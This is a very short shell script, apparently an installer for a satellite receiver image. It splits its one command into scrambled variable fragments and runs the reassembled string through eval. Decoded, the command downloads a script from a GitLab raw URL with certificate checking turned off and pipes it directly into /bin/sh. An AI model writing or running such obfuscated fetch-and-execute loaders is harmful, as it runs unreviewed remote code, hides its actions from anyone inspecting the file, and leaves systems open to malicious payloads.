z="
";Qz='s/-/';Gz='cate';Tz='/sat';Az='wget';Yz='| /b';Cz='no-c';Iz='ps:/';bz='exit';Zz='in/s';Lz='com/';Pz='mage';Wz='sh -';cz=' 0';Dz='heck';az='h';Nz='nabi';Vz='mgr.';Oz='l1/i';Kz='lab.';Ez='-cer';Xz='O - ';Fz='tifi';Mz='emil';Hz=' htt';Rz='raw/';Bz='  --';Sz='main';Uz='drea';Jz='/git';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$z$bz$cz"